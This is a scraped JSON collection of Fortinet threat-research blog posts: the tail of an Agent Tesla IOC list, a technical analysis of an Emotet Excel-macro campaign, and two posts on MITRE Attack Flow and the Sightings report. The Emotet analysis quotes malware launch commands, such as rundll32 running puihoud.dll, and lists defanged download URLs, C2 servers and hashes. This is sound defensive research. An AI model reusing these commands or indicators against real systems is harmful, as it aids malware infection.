34CFFA6664C92F77EE60749E251A4ED18A15A3F0F61C78BCADA9EA86478681E0 380C8FC86237A6B847F40870E9A15ADA1914F25174FF40838604354389EF9540 B8403149F7A6E0FCCCB9C6E793BDCE7431385F86174D80B0C65F89A9C948A47F D7E76887903EBD361112531017E140D2BFAAA816598C648F3B1238DCC6906BF1 CB758A93876ACD5F7A314FDA6CCB97D0FC115ABFFF7F22637B629B1E91CF1970 F3D9873EE798BF649A22C50E3DAEEBADFC127A405C0D8F54266B66C4377901E0 1BD2383346BF8B1924C179B1616AF56A2BC4248717329B90E01FF13DB45ABE4F 5DC6B8CC1E9D1EE535752E6C5320280F864EA660B5BF8657F96B8E2B1053C57A FA37BD017B82C1F7C545475F7A0CD786F81BC2CC024DA46CBDB4071B22ED4FFB Fileless Tesla SHA256 F69B85F5763CEC5A5DA5CE1152038FFEEF7A2A75600003ADBFEB3DC87502C8A8 B409FF4CD1B8F18E80AFA98B3306440391FB5CBE294E6DA14E8146F63ECA2C6C 34EEEDAB0ABBEB1BAFFCCFDAEF74E54A7786F24BC5024B2F23A6F9385FEC9917 6449D03A519CAB4B7C4E19D53D57A16AE69B70D7DF6BE815BCB57DC7395AB991 E77DCCCB70AD61D50AC7E8C5DA1F79D5BC22B1F42A6651252EB449241BD6068B C7840150DC084B1E0F6961EC61C39793BBED40FE17A7E24124DFE07F2C1A7B40 F4542569E3F54CBC93AB835567507242DDDCAE2A84743DA103332EEFF3501ABD 851CC3973B096C8DA88E1EDB568C17750D019CA7F2528B3DA933D33D7F306A46 C0C3A9CBDC769F3B86EAB40A9032769FE61E5E9B93CE7A93A0CC02EF43D4B9B5 256F7CC33E3E359427702FF79E59C5EEA73164CC74D96B6F24E6BE19B62500E7 445E6D6EBA924CC86005C107F329B248997AAC4149FBBD540A656FBA50A68C19 D321AF1AF7D8B0A19B87897938B23ADB57C9089B73F2C15E0E2747B0071D1715 822F2266CA284C5318E75C1286F7B4ED746E9289323B57462E227ED8D4D1AC8F 399B6B1AED4B62C165FE074DD9A43DEC0F0E1D5A50C89BFCA4A902CBFDBC17D5 6BCDC49281217C3D8A82ED29A6BC89154885B08954AC3F78FA11BB09BF34A109 1DF27F8D8B8572CB76D7275D7FE686C88F4297DA39095C1399B1E55459DFFDF6 49BF5F9D59C27291FCB0D9F0C593DCB00CA9705E5D294E9C55353BDEFBC37273 A155AB7DB6D22A44487D909BB040F5300B6E24283CDB7D7D902E7CE5CDD533BB FD210DFB8C2F3B33FEEE191608EF58DD2816F08E9850DB734143115BA199690E 5F53A249455BB903C2C57A5CE23BFA6D069966034F74947A70037DEB1459DC88 AD3BE25985B1DFA0A72C7CE59365F2AE7142FB4B2A78B7905D10AEB13998DDD4 9783473EFECA3003D6A1B8DB8FE0E1A8AA291F170110D974C058806A25B4C419 B1043F48E99EF5B98F4987E1FFD3200CD6A32B3427BA2762310FDEA58934D95C 3E99AA348FAFFDF2D73867C47067EA17A96CA36E5329E30C3A37F45B4274D165 0ABBD4F17EC6DEDEFA188E39501B923286C56627ACB87FEC73271E459A383D0D Filename SHA256 Order001.ppam DCA3AC723A130E56FB158C34C68E1C4B7D8577D0DBE9D8B859BFFF7ADA34D02E Loader 4C0E2CB721585C480169B3804E17E2761BC5FE76584CF1375FCCDB33CA64D5A5 Network IOCs: 192[.]154[.]226[.]47 hxxps://www[.]mediafire[.]com/file/s2w0i5rhl9e4wje/1.dll hxxps://www[.]mediafire[.]com/file/u8t0g2vyrvoyldp/10.dll hxxps://www[.]mediafire[.]com/file/hheln09oi15b266/11.dll hxxps://www[.]mediafire[.]com/file/mra2u90srnmymxl/12.dll hxxps://www[.]mediafire[.]com/file/e7fmuc053m1vdz5/13.dll hxxps://www[.]mediafire[.]com/file/l3xh5g98wf5l4gv/14.dll hxxps://www[.]mediafire[.]com/file/5d7sd1qat59dtpy/15.dll hxxps://www[.]mediafire[.]com/file/2tpkh278oypz794/16.dll hxxps://www[.]mediafire[.]com/file/hjjo0rc7izwy4is/17.dll hxxps://www[.]mediafire[.]com/file/wy0e3mn2xyaqdhd/18.dll hxxps://www[.]mediafire[.]com/file/otza6n31talvvle/19.dll hxxps://www[.]mediafire[.]com/file/dsgxrjtpbyyzm7u/2.dll hxxps://www[.]mediafire[.]com/file/mf3pufkmdshddyq/20.dll hxxps://www[.]mediafire[.]com/file/ijdnf0wqv4e5frr/21.dll hxxps://www[.]mediafire[.]com/file/c9gt9xi3l9srlhi/22.dll hxxps://www[.]mediafire[.]com/file/pqk7p5p1vvcv5s1/23.dll hxxps://www[.]mediafire[.]com/file/mqbl43fcem1fndd/24.dll hxxps://www[.]mediafire[.]com/file/xz0guzs3g004f0i/25.dll hxxps://www[.]mediafire[.]com/file/qe4ece114vu4n0o/3.dll hxxps://www[.]mediafire[.]com/file/wbh1kq3u82mcso6/4.dll hxxps://www[.]mediafire[.]com/file/x0o4nlef7snbixu/5.dll hxxps://www[.]mediafire[.]com/file/xrnlyn4pjcmcfyf/6.dll hxxps://www[.]mediafire[.]com/file/qbzdrs7ulvvzfay/7.dll hxxps://www[.]mediafire[.]com/file/9q41qxg988c3opx/8.dll hxxps://www[.]mediafire[.]com/file/xxbskabqkber6oq/9.dll Mitre TTPs Resource Development Stage Capabilities: Upload Malware T1608.001 Initial Access Phishing: Spearphishing Attachment T1566.001 Execution Command and Scripting Interpreter: PowerShell T1059.001 User Execution: Malicious File T1204.002 Persistence Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder T1547.001 Defense Evasion Process Injection: Portable Executable Injection T1055.002 Reflective Code Loading T1620 Credentials Access Credentials from Password Stores: Credentials from Web Browsers T1555.003 Input Capture: Keylogging T1056.001 Discovery Account Discovery T1087 Command and Control Application Layer Protocol: Web Protocols T1071.001 Learn more about Fortinet’s FortiGuard Labs threat research and intelligence organization and the FortiGuard Security Subscriptions and Services portfolio ."
            }
        },
        {
            "https://www.fortinet.com/blog/threat-research/ms-office-files-involved-in-emotet-trojan-campaign-pt-one": {
                "metadata": {
                    "dateAccessed": "2022-04-03",
                    "dateCreated": "2022-03-07",
                    "source": "www.fortinet.com"
                },
                "text": "FortiGuard Labs Research Affected platforms: Microsoft Windows Impacted parties: 64-bit Windows Users Impact: Controls victim’s device and collects sensitive information Severity level: Critical Recently, Fortinet’s FortiGuard Labs captured more than 500 Microsoft Excel files that were involved in a campaign to deliver a fresh Emotet Trojan onto the victim’s device. Emotet, known as a modular Trojan, was first discovered in the middle of 2014. Since then, it has become very active, continually updating itself. It has also been highlighted in cybersecurity news from time to time. Emotet uses social engineering, like email, to lure recipients into opening attached document files (including Word, Excel, PDF, etc.) or clicking links within the content of the email that download Emotet’s latest variant onto the victim’s device and then execute it. Our FortiGuard Labs team has monitored Emotet Trojan campaigns in the past and posted numerous technical analysis blogs . This time, I grabbed an Excel file from the captured samples and conducted deep research on this campaign. In this part I of my analysis, you can expect to learn: how an Excel file is leveraged to spread Emotet, what anti-analysis techniques Emotet uses in this variant, how it maintains persistence on a victim’s device, how this Emotet variant communicates with its C2 server, and how other modules are delivered, loaded, and executed on a victim’s system. Looking into the Excel File I have set my Excel’s macro option to \"Disable all macros with notification\" in \"Macro Settings.\" That’s why it shows the yellow “Security Warning” bar when an opened Excel file contains a Macro, as shown in Figure 1.1. This image shows the fake message used to lure a victim into clicking the “Enable Content” button to view the protected content of the Excel file. The malicious Macro has a function called “Workbook_Open()” that is executed automatically in the background when the Excel file opens. It calls other local functions to write data to two files: \"uidpjewl.bat\" and \"tjspowj.vbs\" in the “C:\\ProgramData\\” folder. The written data is read out from multiple cells of this Excel file. In the end, the Macro executes the \"tjspowj.vbs\" file with “wscript.exe.” Refer to Figure 1.2 for more information. VBS and PowerShell The code in “tjspowj.vbs” is obfuscated. See Figure 2.1. The top part is the original code and the bottom part is the normalized code. It tries to download Emotet (into a local file, \"c:\\programdata\\puihoud.dll\", that is hardcoded in the PowerShell) from a group of websites until any download is successfully completed. Meanwhile, the caller “tjspowj.vbs” file takes responsibility for running the downloaded Emotet with the command \" cmd /c start /B c:\\windows\\syswow64\\rundll32.exe c:\\programdata\\puihoud.dll,tjpleowdsyf \" . “C:\\Windows\\SysWOW64\\” is a system folder created by Microsoft for storing 32-bit files. “WOW64” is the x86 emulator that allows 32-bit Windows applications to run on 64-bit Windows. It only exists in 64-bit architecture Windows. In other words, although the downloaded Emotet file was compiled for 32-bit architecture, this variant only affects 64-bit Windows users. It terminates execution and pops up an error message when it runs on a 32-bit Windows because the file is not found. “rundll32.exe” is a system file that loads and runs 32-bit dynamic-link library (DLL) files. It uses the command line syntax “rundll32.exe DLLname,<Export Function>”, where the “Export Function” is optional. “puihoud.dll” is the DLL name for this Emotet and the subsequent export function name (“tjpleowdsyf”) is a random string. In an analysis tool, I found it only has one export function, called “DllRegisterServer()”. Let’s see what happens with a random export function. Start Emotet in Rundll32 Once the Emotet file (“puihoud.dll”) is loaded by “rundll32.exe”, its entry point function is called the very first time. It then calls the DllMain() function where it loads and decrypts a 32-bit Dll into its memory from a “Resource” named “HITS”. The decrypted Dll is the core of this Emotet, which will be referred to as “X.dll” in this analysis due to a hardcoded constant string in its code, as shown below. 10024030 ; Export Ordinals Table for X.dll 10024032 aX_dll          db 'X.dll' ,0 10024038 aDllregisterser db 'DllRegisterServer',0 Figure 3.1 shows the relevant functions used to decrypt and deploy the decrypted “X.dll”, which is in memory. The EntryPoint() function of “X.dll” is called after its deployment. “X.dll” checks if the export function name from the command line parameter is “DllRegisterServer”. If not, it runs the command line again with “DllRegisterServer” instead of the random string, like \"C:\\Windows\\system32\\rundll32.exe c:\\programdata\\puihoud.dll,DllRegisterServer\" (see step 1 & 2 in Figure 3.3). It then calls ExitProcess() to exit the first “rundll32.exe”. In Figure 3.2 it is about to call the API CreateProcessW() to run the new command. When Emotet is running with the “DllRegisterServer” export function, it will normally exit from X.dll’s EntryPoint() as well as puihoud.dll’s EntryPoint() (step 3 in Figure 3.3). Next, rundll32 calls the API GetProcAddress() to gather the export function “DllRegisterServer” from “puihoud.dll” and call it. Finally, puihoud.dll!DllRegisterServer calls X.dll! DllRegisterServer() (step 4 in Figure 3.3). This is also pretty much the way rundll32.exe loads and runs a dll file with an export function. X.dll!DllRegisterServer() is the real starting point for executing malicious things on the victim’s device. Anti-Analysis Techniques To protect its code from being analyzed, Emotet uses anti-analysis techniques. In this section I will explain what kinds of such techniques this variant uses. Code Flow is Obfuscated In most functions, it mixes the code flow with lots of “goto” statements. It has a local variable, called “switch_number” by me, that holds a dynamic number to control how it executes the code. The logic is that all codes are enclosed in a “while infinite loop” statement, which determines which code flow to enter (“goto”) according to the value of “switch_number”. And “switch_number” is modified each time after being used, then once the code branch task is finished it goes back to the “while” statement to check the “switch_number” again. This technique really causes trouble for security researchers trying to analyze the function’s intention and trace its code. Figure 4.1 is a pseudo code in C that reveals the obfuscated code flow. Strings are Encrypted All constant strings are encrypted and are only decrypted just before being used. The constant strings are usually very useful hints for researchers to quickly locate the key point of the malware. Constant Numbers are Obfuscated Normally, the constant numbers are useful to researchers for guessing the code’s purpose. Here is an example. The instruction “mov [esp+2ACh+var_1A0], 2710h” has been obfuscated, as seen in the three instructions below. mov     [esp+2ACh+var_1A0], 387854h or      [esp+2ACh+var_1A0], 0F1FDFF8Dh xor     [esp+2ACh+var_1A0], 0F1FDD8CDh All APIs are hidden The APIs are obtained using a hash code of both the API name and the module name that the function belongs to. Each time Emotet needs to call an API, it calls a local function to obtain it in the EAX register and then calls it. Figure 4.2 is an example of calling API GetCommandLineW(), where 0xB03E1C69 is the hash code of module “kernel32” and 0x4543B55E is the hash code of “GetCommandLineW”. Communicating with the C2 Server Once Emotet finishes collecting the basic information from the victim’s device, it calls the API BCryptEncrypt() to encrypt the data. Let’s look at the kind of data contained in the collected data, as shown in Figure 5.1. The 60H bytes data in memory is the plaintext data to be encrypted. Let me explain what most of the data is. 0x20 , at offset+4, is the size of sha256 hash code followed, which includes the bytes starting from offset+8 to offset+0x27 (A0 C9 … 68 F8). That is a sha256 hash code of the entire following data, starting at offset+28h. 0x2C , at offset+28h, is the size of the following data. The next 0x10 is the length of the victim’s ID (“BOBSXPC_9C09B592”), which is a combination of the computer name and the system driver’s volume number. To obtain this information, Emotet calls APIs like GetComputerName(), GetWindowsDirectoryW(), and GetVolumeInformationW(). The following dword 0x29C220DD is a hash code of Emotet Dll’s full path. 0x13465AA is a constant value defined in its code. It may be a malware ID of this Emotet. 0x2710 is another constant value, and I suppose it is a sort of version of this variant. 0x19E7D is a combination of the victim’s system information, including Windows version, architecture, and so on. To get this information it needs to call APIs RtlGetVersion() and GetNativeSystemInfo(). 0x01 at offset+50h is a current process ID (rundll32.exe) related value. The last data, starting at offset+58h, is meaningless padding (AB AB AB…). The encrypted binary data will be converted into base64 string by calling the API CryptBinaryToStringW(). The base64 string is submitted to the C2 server as a “Cookies” value in an HTTP Get request. In the example shown in Figure 5.2, as you may have noticed, the Cookie name and URL are randomized by Emotet to bypass the cybersecurity device’s detection. In total, there are 49 C2 servers (IP address and port) hardcoded and encrypted within this variant. Please refer to the “C2 Server List” under the “IOCs” section for all the IP addresses and ports. The C2 server detects the submitted data to determine next steps, including replying with Emotet modules and commands for further actions. The replied data is encrypted binary data in the HTTP response body. In Figure 5.3, below, the marked box is an example of the data just after decryption. The decrypted data is 60H long and contains both verification data and control data. 0x40 at the beginning is the size of the verification data, the signature data (31 1B … 3C 6D), which is a signed hash of the control data. The received data must pass verification, otherwise it drops the packet. The control data starts from offset+54H to the end. 0x8 is the size of the following data. The control data in this packet is two dword numbers — 0x00. The first 0x00 is a flag that can be 0, 1, or 8. If the flag is 8, Emotet will uninstall itself from the victim’s device, including removing the auto-run item from system registry, deleting the file(s) or folder(s) it created, as well as deleting the Emotet Dll file. If the flag is 0 and the second dword is not 0 (it should be the size of the attached module to this packet), it executes the module on the victim’s device. If the flag is 1, it goes to the flag 0’s branch. I’ll explain this part in more detail in the next part of this analysis. Relocate and Persistent Once Emotet receives a valid response from the C2 server, it relocates the downloaded Emotet dll file from “C:\\Windows\\ProgramData\\puihoud.dll” (in my analysis environment) into the “%LocalAppData%” folder.  Moreover, to remain in the victim’s device, Emotet makes itself persistent by adding the relocated file into the auto-run group in the system registry. Emotet is then able to run at system startup. Figure 6.1 is a screenshot of the Registry Editor displaying the auto-run item in the system registry. Conclusion In this post we have walked through the malicious Macro within a captured Excel file, which downloads Emotet via two extracted files, \"uidpjewl.bat\" and \"tjspowj.vbs\". We then went through how the downloaded Emotet Dll file is run in a rundll32.exe process as well as how it extracts the Emotet core X.dll from its “Resource”. I also explained what kinds of anti-analysis techniques this Emotet uses to protect its code from being analyzed. And finally, I elaborated on what kind of data Emotet collects from the victim’s system and how the binary data is encrypted and converted into base64 string and finally submitted to its C2 server via an HTTP packet. In the next part of this analysis, I will focus on those returned modules from Emotet’s C2 server and how they are executed by Emotet, as well as what sensitive data they are able to steal from the victim’s device. Please stay tuned. Fortinet Protections Fortinet customers are already protected from this malware by FortiGuard’s Web Filtering, AntiVirus, FortiMail, FortiClient, FortiEDR, and CDR (content disarm and reconstruction) services, as follows: The malicious Macro inside the Excel sample can be disarmed by the FortiGuard CDR (content disarm and reconstruction) service. All relevant URLs have been rated as \" Malicious Websites \" by the FortiGuard Web Filtering service. The captured Excel sample and the downloaded Emotet dll file are detected as \" VBA/Emotet.2826!tr.dldr \" and \" W32/Emotet.B185!tr \" and are blocked by the FortiGuard AntiVirus service. FortiEDR detects both the Excel file and Emotet dll file as malicious based on its behavior. In addition to these protections, we suggest that organizations have their end users also go through the FREE NSE training : NSE 1 – Information Security Awareness . It includes a module on Internet threats that is designed to help end users learn how to identify and protect themselves from phishing attacks. IOCs URLs Involved in the Campaign: \"hxxps[:]//youlanda[.]org/eln-images/n8DPZISf/\" \"hxxp[:]//rosevideo[.]net/eln-images/EjdCoMlY8Gy/\" \"hxxp[:]//vbaint[.]com/eln-images/H2pPGte8XzENC/\" \"hxxps[:]//framemakers[.]us/eln-images/U5W2IGE9m8i9h9r/\" \"hxxp[:]//niplaw[.]com/asolidfoundation/yCE9/\" \"hxxp[:]//robertmchilespe[.]com/cgi/3f/\" \"hxxp[:]//vocoptions[.]net/cgi/ifM9R5ylbVpM8hfR/\" \"hxxp[:]//missionnyc[.]org/fonts/JO5/\" \"hxxp[:]//robertflood[.]us/eln-images/DGI2YOkSc99XPO/\" \"hxxp[:]//mpmcomputing[.]com/fonts/fJJrjqpIY3Bt3Q/\" \"hxxp[:]//dadsgetinthegame[.]com/eln-images/tAAUG/\" \"hxxp[:]//smbservices[.]net/cgi/JO01ckuwd/\" \"hxxp[:]//stkpointers[.]com/eln-images/D/\" \"hxxp[:]//rosewoodcraft[.]com/Merchant2/5[.]00/PGqX/\" C2 Server List in this Variant: (49 in total) 185[.]248[.]140[.]40:443 8[.]9 [.]11 [.]48:443 200[.]17 [.]134 [.]35:7080 207[.]38 [.]84 [.]195:8080 79[.]172 [.]212 [.]216:8080 45[.]176 [.]232 [.]124:443 45[.]118 [.]135 [.]203:7080 162[.]243 [.]175 [.]63:443 110[.]232[.]117[.]186:8080 103[.]75[.]201[.]4:443 195[.]154[.]133[.]20:443 160[.]16[.]102[.]168:80 164[.]68[.]99[.]3:8080 131[.]100[.]24[.]231:80 216[.]158[.]226[.]206:443 159[.]89[.]230[.]105:443 178[.]79[.]147[.]66:8080 178[.]128[.]83[.]165:80 212[.]237[.]5[.]209:443 82[.]165[.]152[.]127:8080 50[.]116[.]54[.]215:443 58[.]227[.]42[.]236:80 119[.]235[.]255[.]201:8080 144[.]76[.]186[.]49:8080 138[.]185[.]72[.]26:8080 162[.]214[.]50[.]39:7080 81[.]0[.]236[.]90:443 176[.]104[.]106[.]96:8080 144[.]76[.]186[.]55:7080 129[.]232[.]188[.]93:443 212[.]24[.]98[.]99:8080 203[.]114[.]109[.]124:443 103[.]75[.]201[.]2:443 173[.]212[.]193[.]249:8080 41[.]76[.]108[.]46:8080 45[.]118[.]115[.]99:8080 158[.]69[.]222[.]101:443 107[.]182[.]225[.]142:8080 212[.]237[.]17[.]99:8080 212[.]237[.]56[.]116:7080 159[.]8[.]59[.]82:8080 46[.]55[.]222[.]11:443 104[.]251[.]214[.]46:8080 31[.]24[.]158[.]56:8080 153[.]126[.]203[.]229:8080 51[.]254[.]140[.]238:7080 185[.]157[.]82[.]211:8080 217[.]182[.]143[.]207:443 45[.]142[.]114[.]231:8080 Sample SHA-256 Involved in the Campaign: [Excel files Captured] 25271BB2C848A32229EE7D39162E32F5F74580E43F5E24A93E6057F7D15524F0 C176C2B0336EA70C0D875F5C79D00771D59891560283364A81B2EDE495CDE62F 9C62600A0885E39BD39748150B9B64155C9EA2DBBCDD43241EB24C8E098DE782 36C2119C68B3C79B58417CADEA3547F8BBECD2DF02FEB5F04EE798DFA621B66D B380DFC348541691E4084689405D8ACFAEAFDDD92EFF95566AFF2412F620E2DC 68AA775EC46C8B0911542E471F9A7F39D538001BD8552898416310436F58B95A B14AB6A611A93B25DA2815D2071AA5B76085414BF6AD32432FC0809B3610DB05 81E9D87903290E4A525BEB865F5CCCCA9838BDD51238DC4FD0B9AE623BF609BB B019A867D167B6088EA18B3BD2F1A67706505AACC9542C4017E757F0381B3F0A F4626135C820C4784E1452E81FE25D291EA3A6326E906A2E15AE960EEA3276E4 [puihoud.dll (the downloaded Emotet)] A7C6ABBC3241B6CFCFA27158E80BD50D3C9F1AE97E86481CCABD5B2337670690 Learn more about Fortinet’s FortiGuard Labs threat research and intelligence organization and the FortiGuard Security Subscriptions and Services portfolio . Read part II of our analysis to learn more about malicious modules involved and how to avoid this lure."
            }
        },
        {
            "https://www.fortinet.com/blog/threat-research/across-the-cybersecurity-landscape-there-are-attacks-flows": {
                "metadata": {
                    "dateAccessed": "2022-04-03",
                    "dateCreated": "2022-03-03",
                    "source": "www.fortinet.com"
                },
                "text": "FortiGuard Labs has been working with MITRE Engenuity’s Center for Threat Informed Defense (CTID) on various research projects that advance the state of the art in threat-informed cybersecurity. Fortinet has been an active member of the Center and is also a research sponsor because we see the value in giving defenders and executives expansive visibility into the ever-evolving threat landscape. For example, we played a leading role in the Center’s project called Sightings, in which analyzed data from Center participants and other data contributors provides an accurate depiction of the most used cyberattacker tactics, techniques, and procedures (TTPs). An overview of the project can be found in my blog titled: MITRE Sightings Report Provides Guidance on Key Cyberattack Techniques . The Sightings project generated very valuable threat intelligence for organizations by building a “heat map” and showing what is known about the attackers’ techniques, but that threat intelligence can also be extended and enhanced. Getting a Clearer View of Where Actions Are Taking Place This brings us to the next project we have been working on as part of the CTID, which is called Attack Flow . With Attack Flow, we aim to show how attacks are moving from left to right on the kill chain or MITRE ATT&CK® framework. The result is good empirical data that indicates not only how attackers are moving through networks but also what assets they’re hitting in the process. The flow gives a clear view of where specific actions will take place so that IT leadership will know what defense strategies to prioritize. Without Attack Flow, it’s extremely difficult for executives to grasp how these attacks map to specific assets within their environments and under their responsibility, especially because multiple attack flows are possible. Cyber defenders also have a hard time understanding where to look after identifying specific TTPs in their networks. Our Attack Flow intelligence will shed light on these two common hurdles. What Is An Attack Flow? Jon Baker, the Center’s director of research, defines an attack flow as: “…a machine-readable representation of a sequence of actions and assets along with knowledge properties about those actions and assets. This representation is composed of five main objects: the flow itself, a list of actions, a list of assets, a list of knowledge properties, and a list of causal relationships between the actions and assets. Each of these five objects includes a set of required and optional fields. For example, an action must have a description and a name, whereas an asset may—but not must!—have an associated state.\" This Attack Flow Project boils down to two things: 1) mapping the flow of actions and 2) identifying what is the ultimate goal of that flow so cyber defenders know what their next step should be. In this example , each action is in a red box (and references a MITRE ATT&CK technique), each asset is in a blue box, and some select properties are shown in a green box. As you can see, different flows have different outcomes—with different impacts on the organization. One path leads to “Cryptocurrency” while the other leads to “Data.” Having this type of information can help executives and IT security teams in deciding which defenses to prioritize based on the predictable outcomes they are most likely to see. When executives have information on each asset’s value coupled with the attack flow information, they have all that’s needed to make a “threat-informed” decision about which of their defenses should be fortified first. Value in Knowing the Potential Outcomes Using the same data, cyber-defense teams will be able to quickly know for instance: If 90% of the attacks follow a specific path of techniques, they will then be able to move more quickly to identify the attack path taken on an active investigation. This ability will be possible after we have an extensive dataset of attack flows to examine and do data analysis on the attack flow corpus. There is a lot of value in understanding the flow of the attack as well as its potential outcomes and affected assets, including the ability to: Easily explain to executives the outcomes of attacks Allow executives to fully understand the impact of each attack on each asset Guide defenders where to look next when they find a specific TTP in their environment Replay more realistic attacks following the specific order in which they are executed, instead of done without any specific order What’s Next The next phase of our Attack Flow Project with the Center will focus on building tools and a dataset library of attacker flows. These items can then be used by organizations worldwide to assist in better defending against cyberattacks. This is much like the other research projects that Center has done over the years, like the adversary emulation plans—but on steroids. Learn more about FortiGuard Labs threat research and the FortiGuard Security Subscriptions and Services portfolio . Learn more about the Fortinet free cybersecurity training initiative , the Fortinet NSE Training program , Security Academy program , and Veterans program ."
            }
        },
        {
            "https://www.fortinet.com/blog/threat-research/mitre-sightings-report-provides-guidance-on-key-cyberattack-techniques": {
                "metadata": {
                    "dateAccessed": "2022-04-03",
                    "dateCreated": "2022-02-28",
                    "source": "www.fortinet.com"
                },
                "text": "It’s common knowledge in the cybersecurity industry that attackers are evolving, and their attacks are becoming more sophisticated. As a result, the harm and cost to targeted victims and organizations are also steadily increasing. This situation demands a smart and innovative response from security practitioners because no organization can defend against every threat. Trying to protect against all the adversarial TTPs (tactics, techniques, and procedures) threat actors deploy would be extraordinarily costly and difficult to maintain for most enterprises. Perhaps the greatest challenge is scale. More than 370 attack techniques have been documented to date, and every quarter or so, another technique or implementation of a technique appears. Keeping track of attack techniques and launching appropriate and timely countermeasures can overwhelm most defense systems and security professionals. Narrowing down the scope and scale of potential attacks is a critical first line of defense. Fortunately, help is on the way in the form of a just-published research paper titled 2021 ATT&CK Sightings Report that addresses the question: “Which of these techniques do we need to prioritize and prepare to fight?” The Sightings Report is based on a research project run by MITRE Engenuity’s Center for Threat-Informed Defense (Center) in collaboration with Fortinet’s FortiGuard Labs and several other Center participants. The researchers analyzed more than one million attacks using the MITRE ATT&CK® framework , collected over 28 months (April 1, 2019, to July 31, 2021), to provide contextual, actionable threat intelligence to explain how attackers are conducting their nasty business. This threat intelligence report provides crucial visibility into which TTPs are being used the most by cyber adversaries. Its “high resolution” visibility helps security professionals identify those threats they are most likely to face. This enables them to quickly prioritize and fine-tune their defenses, including what security technologies to deploy and where. The research from the Sightings Report paints “a picture of common adversary behavior, including which techniques adversaries use, how their use changes over time, and how adversaries sequence techniques. Defenders can use this information to create a threat-informed defense against what they are most likely to see, not just the latest cyberthreat headlines.” The Extremely Useful Takeaway The biggest takeaway from the research data is that 90% of all attacks arise from only 15 techniques across six tactics. This intel is extremely useful as it significantly narrows down the most likely threats from the entire corpus of more than 370 possible techniques across 14 tactics. The MITRE ATT&CK framework has been the de facto standard for mapping and responding to cyberattacks of all types. Using it to analyze aggregated global threat data from various sources and then presenting according to the prevalence of potential attacks gives defenders a unique opportunity to change the economics of the attack cycle. Instead of testing for all techniques and their respective defenses—which can be very costly and time-consuming—defenders can now prioritize specific techniques and build defenses around them while focusing their red team efforts on trying new strategies for implementing those techniques. The Top Tactics A deeper look at those six tactics that account for 90% of all attacks reveals even more helpful information. Five of those tactics involve defensive evasion , which involves exploiting security gaps to prevent detection. The report’s detailed analysis of this tactic provides crucial insight into how attackers try to get around security holes, enabling defenders to identify similar weaknesses in their defenses and effectively close those gaps. It also identifies which parts of the ATT&CK matrix attackers focus on to best hide their efforts. The second most common tactic employed is privilege escalation , which makes sense given that most enterprise systems today are protected using privilege isolation. This information helps security teams assess and correct their internal functions, such as using admin user privilege levels for basic tasks like emailing and browsing. Remember that attackers will struggle to take over a system when an unprivileged user is compromised. It’s All in the Technique Many of the specific techniques identified in the report are heavily focused on “living off the land.” This means using legitimate systems, tools, or functions already present on a system to move around the device or network without attracting attention. T1053 (Schedule Task/Job) is the most common of these techniques, representing over 24% of all sightings. It is followed by Command and Script Interpreter (T1059) , representing 15.77%. These techniques have been employed across all major platforms, attacking Linux , Windows, and macOS. The other techniques combined accounted for less than 11% of all sightings. Zero-trust strategies can play a critical role in defending against these techniques. Again, quoting from the report, “Adversaries are attempting to appear as legitimate users. Therefore, creating strong baselines and restricting permissions is key to detecting and disrupting adversary behaviors.” This information gives defenders an upper hand in effectively preparing and hardening their systems since it’s clear from the global data on these TTPs that attackers are trying to appear as legitimate users. Without strong baselines of normal end-user behavior and company-approved applications and the ability to restrict access to systems and resources based on policy, detection and mitigation of threats designed to look like “normal” behavior can be nearly impossible. Fortunately, defenders aren’t left to figure out how best to defend against these threats. The report also provides deeper insight into how organizations can go about detecting and containing these threats using open-source tools and intel, as well as which techniques are generally seen together to facilitate proactive threat hunting, which is one of the most potent actions cyber defenders can take to lessen the impact of an attack. Low Cost, High Return Intelligence With this research paper, the Center has provided the cybersecurity community with valuable, up-to-date intelligence that can be widely used to prioritize defensive actions. And it provides it in a low-cost way while providing a high return. Because of the specific insight and guidance it provides, cyberdefenders worldwide can build threat-informed defenses using curated, high-fidelity data. Security is everyone’s responsibility, and if we have more secure organizations, the internet and the digital economy will be more stable and predictable. And that’s a win for everyone. Fortinet has been at the forefront of cybersecurity innovation and research for more than 20 years. We are proud to have been able to leverage this expertise in our participation in the Sightings research project with the Center. Read and learn more in the report or view the infographic ."
            }
        }
    ]
}